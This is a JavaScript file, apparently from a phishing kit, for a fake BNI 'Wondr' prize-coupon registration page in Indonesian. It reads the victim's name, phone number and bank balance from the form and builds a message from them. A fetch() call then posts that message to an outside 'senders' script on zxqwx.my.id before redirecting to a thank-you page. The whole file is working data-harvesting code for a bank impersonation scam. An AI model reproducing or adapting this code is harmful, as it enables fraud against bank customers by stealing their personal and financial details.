import { API_URL } from './global.js';

$(document).ready(function() {
	/* FOR TEST ONLY */
	/*$("#name").val("Bagas");
	$("#balance").val("20000000");
	$("#phone").val("81123456789");*/
	/* */
	$("#balance").on('input', function() {
		let value = $("#balance").val().trim().replace(/[^0-9]/g, '');
        $("#balance").val(value.replace(/\B(?=(\d{3})+(?!\d))/g, '.'));
	});
});

function next() {
	var type = $("#type").val().trim();
	var name = $("#name").val().trim();
	var balance = $("#balance").val().trim();
	var phone = $("#phone").val().trim();
	if (name=="" || balance=="" || phone=="") {
		alert('Mohon lengkapi data!');
		return;
	}
	phone = "+62"+phone;
	$("#loader").css('display', 'flex');
	
	var message = ('\n<b>Hadiah:</b>\n'+type+'\n\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n');
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"daftar-kupon-undian-wondr-bni/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
	window.localStorage.setItem('name', name);
          window.localStorage.setItem('phone', phone);
          window.localStorage.setItem('balance', balance);
          $("#loader").css('display', 'none');
		  window.location.href = "thank.html";
}

module.next = next;